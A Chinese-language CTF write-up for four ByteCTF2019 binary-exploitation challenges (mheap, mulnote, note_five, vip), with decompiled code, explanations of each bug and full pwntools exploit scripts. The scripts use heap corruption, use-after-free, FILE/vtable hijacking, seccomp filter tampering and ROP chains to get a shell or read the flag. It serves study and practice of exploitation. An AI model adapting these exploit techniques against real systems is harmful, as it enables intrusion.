---
title: ByteCTF2019
categories:
- ByteCTF2019
---
# ByteCTF2019 PWN 部分writeup

## 前言


是七哥最后一场线上赛，看七哥姚老板P1umer日天日地日虚拟机日浏览器感觉自己差的太多了，要更努力。

## mheap

### 程序逻辑

程序是自己实现的malloc和free，有alloc、show、free、edit等四个功能，自己分析半天没找到漏洞，看了wp才晓得。

alloc不限制输入的size，输入一个非负的size，首先0x10对齐，之后加上0x10的chunk头。自定义的chunk_addr[0]为其size，chunk_addr[1]为上一个释放的堆块地址。

```c
unsigned __int64 __fastcall Alloc(unsigned int idx)
{
  int size; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( idx <= 0xF )
  {
    size = 0;
    printf("Input size: ");
    __isoc99_scanf("%d", &size);
    qword_4040E0[idx] = MyAlloc(size);
    printf("Content: ", &size);
    get_input(qword_4040E0[idx], size);
    puts("Done!");
  }
  return __readfsqword(0x28u) ^ v3;
}

_QWORD *__fastcall MyAlloc(int size)
{
  _QWORD *v2; // ST10_8
  int final_size; // [rsp+4h] [rbp-14h]
  int chunk_size; // [rsp+4h] [rbp-14h]
  _QWORD *chunk_addr; // [rsp+10h] [rbp-8h]

  final_size = size;
  if ( size <= 0 )
    return 0LL;
  if ( size & 0xF )
    final_size = size + 16 - (size & 0xF);      // 0x10对齐，向上取整
  chunk_size = final_size + 16;
  chunk_addr = MyMalloc(chunk_size);            // 0x10的chunk头
  if ( chunk_addr )
    return chunk_addr + 2;
  if ( qword_4040C0 <= 0 )
    return 0LL;
  v2 = (_QWORD *)qword_4040C8;
  qword_4040C8 += chunk_size;
  qword_4040C0 -= chunk_size;
  *v2 = chunk_size;
  return v2 + 2;
}

_QWORD *__fastcall MyMalloc(int chunk_size)
{
  _QWORD *result; // rax
  _QWORD *v2; // [rsp+4h] [rbp-10h]
  _QWORD *i; // [rsp+Ch] [rbp-8h]

  v2 = (_QWORD *)qword_4040D0;
  if ( !qword_4040D0 )
    return 0LL;
  if ( (*(_QWORD *)qword_4040D0 & 0xFFFFFFFF0LL) == chunk_size )
  {
    qword_4040D0 = *(_QWORD *)(qword_4040D0 + 8);// fast bin
    result = v2;
  }
  else
  {
    for ( i = *(_QWORD **)(qword_4040D0 + 8); i; i = (_QWORD *)i[1] )
    {
      if ( (*i & 0xFFFFFFFF0LL) == chunk_size )
      {
        v2[1] = i[1];
        return i;
      }
      v2 = i;
    }
    result = 0LL;
  }
  return result;
}
```

Free函数将释放堆块的chunk[1]处改为上一个释放堆块的地址，0x4040d0处填入此堆块的地址，类似实现fastbin的链表结构。

```c
int __fastcall Free(unsigned int idx)
{
  __int64 chunk_addr; // rax

  if ( idx <= 0xF )
  {
    chunk_addr = qword_4040E0[idx];
    if ( chunk_addr )
    {
      MyFree(qword_4040E0[idx]);
      qword_4040E0[idx] = 0LL;
      LODWORD(chunk_addr) = puts("Done!");
    }
  }
  return chunk_addr;
}

signed __int64 __fastcall MyFree(__int64 chunk_addr)
{
  signed __int64 result; // rax

  *(_QWORD *)(chunk_addr - 16 + 8) = qword_4040D0;
  result = chunk_addr - 16;
  qword_4040D0 = chunk_addr - 16;
  return result;
}
```

Edit可以编辑0x10字节的堆块，Show可以打印堆块内容。

### 漏洞利用

漏洞出现在get_input函数，read函数向ptr+count处写数据，一旦我们分配的size大于add的总和(超过0x1000的边界)，read写边界之后的数据是非法的，因此会返回-1。这里返回值的判断出了问题，此时会绕过判断，count--，变成-1，现在向ptr-1处写，依然会写到边界后的数据，因此依然写入失败，返回-1，再继续后向尝试...，一直到遇到换行符结束寻找退出（注意此时还是写入了数据，只是不够我们要求的数据长度，提前结束了read的后向寻址），或者一直没遇到换行符，找到一个足够容纳数据长度的地址开始写。利用这个漏洞我们可以后向修改一个释放chunk的chunk[1]，为0x4040e0，之后再分配一个相同大小的chunk就会把这个chunk分配掉，0x4040d0处写入0x4040e0，之后再分配一个0x2333000的chunk，程序会从0x4040e0开始找，找一个size部分合适的堆块分配，而0x4040e0的size位置正合适，因此分配这个块，可以覆写0x4040f0处即chunk_list[2]为atoi_got，Show泄露libc，Edit改成system函数，之后atoi("/bin/sh\x00")拿shell。

```c
__int64 __fastcall get_input(__int64 ptr, signed int size)
{
  __int64 result; // rax
  signed int count; // [rsp+18h] [rbp-8h]
  int read_bytes; // [rsp+1Ch] [rbp-4h]

  count = 0;
  do
  {
    result = (unsigned int)count;
    if ( count >= size )
      break;
    read_bytes = read(0, (void *)(ptr + count), size - count);
    if ( !read_bytes )
      exit(0);
    count += read_bytes;
    result = *(unsigned __int8 *)(count - 1LL + ptr);
  }
  while ( (_BYTE)result != '\n' );
  return result;
}
```

```data
0x4040d0:       0x00000000004040e0      0x0000000000000000
0x4040e0:       0x0000000023330010      0x0000000023330f20
0x4040f0:       0x0000000023330f90      0x0000000000000000
0x404100:       0x0000000000000000      0x0000000000000000
```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./mheap')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./mheap')
else:
    libc = ELF('./libc-2.27.so')
    p = remote('49.232.101.194',54337)

def Alloc(idx,size,content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(size))
    if size >= 0:
        p.recvuntil("Content: ")
        p.send(content)

def Show(index):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Free(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Edit(idx,content):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.send(content)

def exp():
    Alloc(0,0xf00,"a\n")
    Alloc(1,0x60,"a"*0x60)

    Free(1)

    Alloc(2,0x100,p64(0x70)+p64(0x4040e0)+"x"*(0xe0-1)+"\n")
    Alloc(1,0x60,"a"+"\n")
    gdb.attach(p)
    Alloc(2,0x23330000,p64(0x404050)+"\n")
    Show(2)
    libc_base = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-(0x7f3fddc82680-0x7f3fddc42000)
    log.success('libc base => ' + hex(libc_base))
    system_addr = libc.symbols['system'] + libc_base
    Edit(2,p64(system_addr))
    #gdb.attach(p)
    #raw_input()
    #p.recvuntil("choice: ")
    p.sendline("/bin/sh\x00")
    p.sendline("/bin/sh\x00")
    p.interactive()

exp()
```

## mulnote

### 漏洞利用

free之后10s才清空，UAF

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./mulnote')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./mulnote')

else:
    libc = ELF('./libc.so')

def Create(size,note):
    p.recvuntil('>')
    p.sendline('C')
    p.recvuntil("size>")
    p.sendline(str(size))
    p.recvuntil("note>")
    p.send(note)

def Edit(index,note):
    p.recvuntil('>')
    p.sendline('E')
    p.recvuntil("index>")
    p.sendline(str(index))
    p.recvuntil('new note>')
    p.send(note)

def Show():
    p.recvuntil('>')
    p.sendline('S')

def Remove(index):
    p.recvuntil('>')
    p.sendline('R')
    p.recvuntil("index>")
    p.sendline(str(index))


def exp():
    #leak libc
    Create(0x88,'a')#0
    Remove(0)
    Show()
    p.recvuntil("[*]note[0]:\n",drop=True)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) -3951480
    log.success('libc base => ' + hex(libc_base))

    #
    fake_chunk = libc_base + libc.sym['__malloc_hook'] - 0x23
    shell_addr = libc_base + gadgets[1]
    time.sleep(10)
    Create(0x68,'a')#0
    Create(0x68,'a')#1
    Remove(0)
    #gdb.attach(p)
    Remove(1)
    #Show()

    Remove(0)
    Create(0x68,p64(fake_chunk))#0
    Create(0x68,p64(fake_chunk))#1
    Create(0x68,p64(fake_chunk))#2

    Create(0x68,'\x00'*0x13+p64(shell_addr))
    p.recvuntil('>')
    p.sendline('C')
    p.recvuntil("size>")
    p.sendline("17")

    p.interactive()

exp()
```

## note_five

### 漏洞利用

看着17师傅的exp复现了一遍。程序有off-by-one，禁用了fastbin，上来先构造overlapchunk，unsorted bin修改global_max_fast，之后可以使用smallbin。在stdout前寻找合适size的fake_chunk，这里用的是stderr的flag字段的0xfb作为size，分配0xe8的堆块到这里，之后再往后构造一个fake_chunk，从而得以覆写stdout，泄露libc。拿shell的方法是构造fake_vtable(之前的数据照抄，0xd8处改成伪造的vtable地址，使得__xsputn=one_gadget即可)

```data
gdb-peda$ p* (struct _IO_jump_t *)0x7ffff7dd26c8
__dummy = 0x0, 
__dummy2 = 0x0, 
__finish = 0x0, 
__overflow = 0xffffffff, 
__underflow = 0x0, 
__uflow = 0x0, 
__pbackfail = 0x7ffff7dd26c8 <_IO_2_1_stdout_+168>, 
__xsputn = 0x7ffff7afe147 <exec_comm+2263>, 
__xsgetn = 0x7ffff7afe147 <exec_comm+2263>, 
__seekoff = 0x7ffff7dd18e0 <_IO_2_1_stdin_>, 
__seekpos = 0x7ffff7a2db70 <__gcc_personality_v0>, 
__setbuf = 0x0, 
__sync = 0x0, 
__doallocate = 0x0, 
__read = 0x0, 
__write = 0x0, 
__seek = 0x0, 
__close = 0x0, 
__stat = 0x0,                                           __showmanyc = 0x0,                                      __imbue = 0x0
```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./note_five')
libc_offset = 0x3c4b20
global_max_fast = 0x3c67f8
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./note_five')

else:
    libc = ELF('./libc.so')

def Add(idx,size):
    p.recvuntil('choice>> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(size))

def Edit(idx,content):
    p.recvuntil('choice>> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil('content: ')
    p.send(content)

def Delete(idx):
    p.recvuntil('choice>> ')
    p.sendline('3')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def exp():
    #leak libc
    Add(0,0xf8)#0
    Add(1,0xf8)#1
    Add(2,0xf8)#2
    Add(3,0xf8)#3
    Add(4,0xf8)#4
    Delete(0)
    Edit(2,'\x00'*0xf0+p64(0x100*3)+'\x00')


    Delete(3)#0 & 1 & 2 & 3
    Add(0,0xe0)#0
    Add(0,0x108)#0 overlap 1
    #Add(0,0xf8)#0
    #Add(0,0xf8)#0 == 1
    Edit(2,p64(0)+'\xe8\x37\n')
    Add(3,0x1f8)
    #
    Edit(0,p64(0)+p64(0xf1)+'\x00'*0xe0+p64(0)+p64(0x21)+'\n')

    Delete(1)


    Edit(0,p64(0)+p64(0xf1)+'\x3b\x25\n')
    Add(1,0xe8)

    Add(4,0xe8)#target
    payload = '\x00'*(0xe0-19)+p64(0x101)+p64(0xfbad1800)+'\n'
    Edit(4,payload)
    #
    Edit(0,p64(0)+p64(0x101)+'\n')
    Delete(1)
    payload = p64(0)+p64(0x101)+'\x10\x26\n'
    Edit(0,payload)
    Add(1,0xf8)
    Add(4,0xf8)
    payload = p64(0xfbad1800)+p64(0)*3+'\x00\n'
    Edit(4,payload)
    p.recvuntil('\x00\x18\xad\xfb')
    p.recvn(28)
    libc_base = u64(p.recvn(8)) - (0x7ffff7dd2600-0x7ffff7a0d000)
    log.success('libc base => ' + hex(libc_base))
    libc.address = libc_base
    #gdb.attach(p)
    #get shell
    stdout = libc_base + (0x00007ffff7dd2620-0x7ffff7a0d000)
    one_gadget = 0xf1147
    fake_file = p64(0xfbad2887)+p64(libc.sym['_IO_2_1_stdin_']+131)*7+p64(libc.sym['_IO_2_1_stdout_']+132)
    fake_file += p64(0)*4+p64(libc.sym['_IO_2_1_stdin_'])+p64(1)+p64(0xffffffffffffffff)+p64(0x000000000b000000)+p64(libc_base+(0x7ffff7dd3780-0x7ffff7a0d000))
    fake_file += p64(0xffffffffffffffff)+p64(0)+p64(libc.address+(0x7ffff7dd17a0-0x7ffff7a0d000))+p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2
    fake_file += p64(stdout+0xd8-0x30)+p64(libc_base+one_gadget)*2+'\n'

    gdb.attach(p)

    Edit(4,fake_file)
    
    p.interactive()

exp()
```

## vip

### 前言

第一次做seccomp类的题目，考察bpf的规则编写.

### 漏洞利用

Edit函数里可以修改0x4040e0进行溢出写，也可以通过一些方法改open函数的返回值为0进行溢出写，这里利用的就是seccomp的filter修改系统调用的返回值为errno(0)。根据manual可以知道这个调用是把code作为errno的值返回给用户(并不执行系统调用)
``SECCOMP_RET_ERRNO
              This value results in the SECCOMP_RET_DATA portion of the fil‐
              ter's return value being passed to user space as the errno
              value without executing the system call.``
因此我们用以下规则可以进行如上的操作：
```c
struct sock_filter filter[] = {
    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0), //A = sys_num  
    BPF_JUMP(BPF_JMP|BPF_JEQ, 257, 1, 0), // if A == 257, goto 4  else goto 3    
    BPF_JUMP(BPF_JMP|BPF_JGE, 0, 1, 0), // if A >= 0,goto 4 else goto 3        
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO),
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),
};
```

        

```c
ssize_t __fastcall get_input(void *ptr, int size)
{
  int fd; // [rsp+1Ch] [rbp-4h]

  if ( dword_4040E0 )
    return read(0, ptr, size);
  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
    exit(0);
  return read(fd, ptr, size);
}

unsigned __int64 BeVip()
{
  __int16 v1; // [rsp+0h] [rbp-90h]
  char *v2; // [rsp+8h] [rbp-88h]
  char buf; // [rsp+10h] [rbp-80h]
  char v4; // [rsp+30h] [rbp-60h]
  char v5; // [rsp+31h] [rbp-5Fh]
  char v6; // [rsp+32h] [rbp-5Eh]
  char v7; // [rsp+33h] [rbp-5Dh]
  char v8; // [rsp+34h] [rbp-5Ch]
  char v9; // [rsp+35h] [rbp-5Bh]
  char v10; // [rsp+36h] [rbp-5Ah]
  char v11; // [rsp+37h] [rbp-59h]
  char v12; // [rsp+38h] [rbp-58h]
  char v13; // [rsp+39h] [rbp-57h]
  char v14; // [rsp+3Ah] [rbp-56h]
  char v15; // [rsp+3Bh] [rbp-55h]
  char v16; // [rsp+3Ch] [rbp-54h]
  char v17; // [rsp+3Dh] [rbp-53h]
  char v18; // [rsp+3Eh] [rbp-52h]
  char v19; // [rsp+3Fh] [rbp-51h]
  char v20; // [rsp+40h] [rbp-50h]
  char v21; // [rsp+41h] [rbp-4Fh]
  char v22; // [rsp+42h] [rbp-4Eh]
  char v23; // [rsp+43h] [rbp-4Dh]
  char v24; // [rsp+44h] [rbp-4Ch]
  char v25; // [rsp+45h] [rbp-4Bh]
  char v26; // [rsp+46h] [rbp-4Ah]
  char v27; // [rsp+47h] [rbp-49h]
  char v28; // [rsp+48h] [rbp-48h]
  char v29; // [rsp+49h] [rbp-47h]
  char v30; // [rsp+4Ah] [rbp-46h]
  char v31; // [rsp+4Bh] [rbp-45h]
  char v32; // [rsp+4Ch] [rbp-44h]
  char v33; // [rsp+4Dh] [rbp-43h]
  char v34; // [rsp+4Eh] [rbp-42h]
  char v35; // [rsp+4Fh] [rbp-41h]
  char v36; // [rsp+50h] [rbp-40h]
  char v37; // [rsp+51h] [rbp-3Fh]
  char v38; // [rsp+52h] [rbp-3Eh]
  char v39; // [rsp+53h] [rbp-3Dh]
  char v40; // [rsp+54h] [rbp-3Ch]
  char v41; // [rsp+55h] [rbp-3Bh]
  char v42; // [rsp+56h] [rbp-3Ah]
  char v43; // [rsp+57h] [rbp-39h]
  char v44; // [rsp+58h] [rbp-38h]
  char v45; // [rsp+59h] [rbp-37h]
  char v46; // [rsp+5Ah] [rbp-36h]
  char v47; // [rsp+5Bh] [rbp-35h]
  char v48; // [rsp+5Ch] [rbp-34h]
  char v49; // [rsp+5Dh] [rbp-33h]
  char v50; // [rsp+5Eh] [rbp-32h]
  char v51; // [rsp+5Fh] [rbp-31h]
  char v52; // [rsp+60h] [rbp-30h]
  char v53; // [rsp+61h] [rbp-2Fh]
  char v54; // [rsp+62h] [rbp-2Eh]
  char v55; // [rsp+63h] [rbp-2Dh]
  char v56; // [rsp+64h] [rbp-2Ch]
  char v57; // [rsp+65h] [rbp-2Bh]
  char v58; // [rsp+66h] [rbp-2Ah]
  char v59; // [rsp+67h] [rbp-29h]
  char v60; // [rsp+68h] [rbp-28h]
  char v61; // [rsp+69h] [rbp-27h]
  char v62; // [rsp+6Ah] [rbp-26h]
  char v63; // [rsp+6Bh] [rbp-25h]
  char v64; // [rsp+6Ch] [rbp-24h]
  char v65; // [rsp+6Dh] [rbp-23h]
  char v66; // [rsp+6Eh] [rbp-22h]
  char v67; // [rsp+6Fh] [rbp-21h]
  char v68; // [rsp+70h] [rbp-20h]
  char v69; // [rsp+71h] [rbp-1Fh]
  char v70; // [rsp+72h] [rbp-1Eh]
  char v71; // [rsp+73h] [rbp-1Dh]
  char v72; // [rsp+74h] [rbp-1Ch]
  char v73; // [rsp+75h] [rbp-1Bh]
  char v74; // [rsp+76h] [rbp-1Ah]
  char v75; // [rsp+77h] [rbp-19h]
  char v76; // [rsp+78h] [rbp-18h]
  char v77; // [rsp+79h] [rbp-17h]
  char v78; // [rsp+7Ah] [rbp-16h]
  char v79; // [rsp+7Bh] [rbp-15h]
  char v80; // [rsp+7Ch] [rbp-14h]
  char v81; // [rsp+7Dh] [rbp-13h]
  char v82; // [rsp+7Eh] [rbp-12h]
  char v83; // [rsp+7Fh] [rbp-11h]
  char v84; // [rsp+80h] [rbp-10h]
  char v85; // [rsp+81h] [rbp-Fh]
  char v86; // [rsp+82h] [rbp-Eh]
  char v87; // [rsp+83h] [rbp-Dh]
  char v88; // [rsp+84h] [rbp-Ch]
  char v89; // [rsp+85h] [rbp-Bh]
  char v90; // [rsp+86h] [rbp-Ah]
  char v91; // [rsp+87h] [rbp-9h]
  unsigned __int64 v92; // [rsp+88h] [rbp-8h]

  v92 = __readfsqword(0x28u);
  puts("OK, but before you become vip, please tell us your name: ");
  v4 = 32;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 4;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 21;
  v13 = 0;
  v14 = 0;
  v15 = 8;
  v16 = 62;
  v17 = 0;
  v18 = 0;
  v19 = 0xC0u;
  v20 = 32;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 53;
  v29 = 0;
  v30 = 6;
  v31 = 0;
  v32 = 0;
  v33 = 0;
  v34 = 0;
  v35 = 64;
  v36 = 21;
  v37 = 0;
  v38 = 4;
  v39 = 0;
  v40 = 1;
  v41 = 0;
  v42 = 0;
  v43 = 0;
  v44 = 21;
  v45 = 0;
  v46 = 3;
  v47 = 0;
  v48 = 0;
  v49 = 0;
  v50 = 0;
  v51 = 0;
  v52 = 21;
  v53 = 0;
  v54 = 2;
  v55 = 0;
  v56 = 2;
  v57 = 0;
  v58 = 0;
  v59 = 0;
  v60 = 21;
  v61 = 0;
  v62 = 1;
  v63 = 0;
  v64 = 60;
  v65 = 0;
  v66 = 0;
  v67 = 0;
  v68 = 6;
  v69 = 0;
  v70 = 0;
  v71 = 0;
  v72 = 5;
  v73 = 0;
  v74 = 5;
  v75 = 0;
  v76 = 6;
  v77 = 0;
  v78 = 0;
  v79 = 0;
  v80 = 0;
  v81 = 0;
  v82 = -1;
  v83 = 127;
  v84 = 6;
  v85 = 0;
  v86 = 0;
  v87 = 0;
  v88 = 0;
  v89 = 0;
  v90 = 0;
  v91 = 0;
  read(0, &buf, 0x50uLL);
  printf("Hello, %s\n", &buf);
  v1 = 11;
  v2 = &v4;
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) < 0 )
  {
    perror("prctl(PR_SET_NO_NEW_PRIVS)");
    exit(2);
  }
  if ( prctl(22, 2LL, &v1) < 0 )                // v1可以被修改
  {
    perror("prctl(PR_SET_SECCOMP)");
    exit(2);
  }
  return __readfsqword(0x28u) ^ v92;
}
```

改完之后ORW得到flag(很久没用这个了，注意fd默认是递增的，因此是0，1，2->3)，另外open函数的系统调用是openat，系统调用号为257，我们禁用它之后用opem(sys_num:0)来打开flag进行读取。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./vip')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./vip')
else:
    libc = ELF('./libc-2.27.so')

def Alloc(idx):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def Show(index):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Free(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(index))

def Edit(idx,size,content):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)

def BeVip(payload):
    p.recvuntil("choice: ")
    p.sendline("6")
    p.recvuntil("please tell us your name: \n")
    p.send(payload)

def Exit():
    #p.recvuntil("choice: ")
    #p.sendline("0")
    #p.recvuntil("Index: ")
    #p.sendline("0")
    count = 0
    for i in range(0xfff):
        try:
            p.recvuntil("choice: ")
            p.sendline("0")
            p.recvuntil("Index: ")
            p.sendline("0")
            count += 1
            if count % 0x10 == 0:
                print count
        except:
            return
def exp():
    payload ='\x00'*0x20
    payload += p64(0x0000000000000020)
    payload += p64(0x0000010100010015)
    payload += p64(0x0000000000010035)
    payload += p64(0x0005000000000006)
    payload += p64(0x7fff000000000006)
    BeVip(payload)
    #leak lib
    Alloc(0)
    Alloc(1)
    Free(1)
    heap_lis = 0x404100
    Edit(0,0x68,'a'*0x50+p64(0)+p64(0x61)+p64(heap_lis))
    Alloc(1)
    Alloc(2)#heap list
    Edit(2,0x10,p64(heap_lis)+p64(elf.got['puts']))#0 is heaplis
    Show(1)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc.sym['puts']
    log.success('libc base => ' + hex(libc_base))
    #leak stack
    Edit(0,0x10,p64(heap_lis)+p64(libc_base+libc.sym["environ"]))
    Show(1)
    rbp_addr = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0xf8
    log.success("stack addr => " + hex(rbp_addr))
    bss_base = elf.bss()+0x40
    Edit(0,0x10,p64(heap_lis)+p64(bss_base))

    Edit(1,8,"./flag\x00")#file name


    Edit(0,0x10,p64(heap_lis)+p64(rbp_addr+8))
    #rop
    #open(123,'flag','r')
    #read(123,bss,0x80)
    #write(1,bss,0x80)
    #
    pop_rdi_ret = 0x00000000004018fb
    pop_rsi_r15_ret = 0x00000000004018f9
    pop_rdx_ret = 0x0000000000001b96+libc_base
    pop_rax_ret = 0x00000000000439c8+libc_base
    syscall_ret = 0x00000000000d2975+libc_base
    push_rax_ret = 0x000000000003dfed+libc_base
    mov_rdx_rax_ret = 0x00000000001415dd+libc_base
    rop = ""
    rop += p64(pop_rdi_ret)+p64(bss_base)
    rop += p64(pop_rsi_r15_ret)+p64(0)+p64(0)
    rop += p64(pop_rdx_ret)+p64(0)
    rop += p64(pop_rax_ret)+p64(2)
    rop += p64(syscall_ret)
    #read
    rop += p64(pop_rdi_ret)+p64(3)
    rop += p64(pop_rsi_r15_ret)+p64(bss_base+0x170)+p64(0)
    rop += p64(pop_rdx_ret)+p64(0x80)
    rop += p64(pop_rax_ret)+ p64(0)
    rop += p64(syscall_ret)
    #rop += p64(elf.plt['read'])
    #wriet
    rop += p64(pop_rdi_ret)+p64(1)
    rop += p64(pop_rsi_r15_ret)+p64(bss_base+0x170)+p64(0)
    rop += p64(pop_rdx_ret)+p64(0x80)
    rop += p64(pop_rax_ret)+p64(1)
    rop += p64(syscall_ret)
    rop += p64(pop_rdi_ret)+p64(0)
    rop += p64(elf.plt['exit'])
    Edit(1,len(rop),rop)
    #gdb.attach(p,'b* 0x401897')
    Exit()

    p.interactive()

exp()
```
